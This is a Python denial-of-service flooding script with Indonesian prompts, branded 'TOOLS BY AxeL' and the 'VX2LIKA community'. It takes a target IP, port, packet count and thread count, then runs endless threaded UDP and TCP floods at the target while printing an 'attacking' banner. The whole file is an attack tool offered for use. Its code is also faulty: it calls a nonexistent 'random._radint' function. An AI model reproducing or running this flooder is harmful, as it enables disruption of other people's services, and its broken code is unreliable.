#!/usr/bin/env python
#By AxeL
import os
import threading
import sys
import struct
import random
import time
import socket

os.system("clear")
print("""
\033[91m
 __     ____  ______  _     ___ _  __    _    
 \ \   / /\ \/ /___ \| |   |_ _| |/ /   / \   
  \ \ / /  \  /  __) | |    | || ' /   / _ \  
   \ V /   /  \ / __/| |___ | || . \  / ___ \ 
    \_/   /_/\_\_____|_____|___|_|\_\/_/   \_\
                                              
                    TOOLS BY AxeL
                    NO RENAME CLUB
""")
choice = str(input("\033[96m=====> Yakin? (y/n) : "))
ip = str(input("=====> IP Target    : "))
port = int(input("=====> Port Target  : "))
times = int(input("=====> $ Kirim PACKETS : "))
threads = int(input("=====> $ Kirim THREADS : "))
def lika():
	data = random._radint(577)
	i = random.choice(("[*]","[!]","[#]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(i +"\033[91m VX2LIKA COMMUNITY DATANG MENYERANG !!!")
		except:
			print("\033[91m [!] VX2LIKA COMMUNITY DATANG MENYERANG!!!")

def lika2():
	data = random._radint(1025)
	i = random.choice(("[*]","[!]","[#]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +"\033[91m VX2LIKA COMMUNITY DATANG MENYERANG !!!")
		except:
			s.close()
			print("\033[91m [*] VX2LIKA COMMUNITY DATANG MENYERANG!!!")

def lika3():
	data = random._radint(16)
	i = random.choice(("[*]","[!]","[#]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(i +"\033[91m VX2LIKA COMMUNITY DATANG MENYERANG !!!")
		except:
			print("\033[91m [!] VX2LIKA COMMUNITY DATANG MENYERANG!!!")

for y in range(threads):

	if choice == 'y':

		th = threading.Thread(target = lika)
		th.start()
		th = threading.Thread(target = lika2)
		th.start()
	else:
		th = threading.Thread(target = lika3)
		th.start()
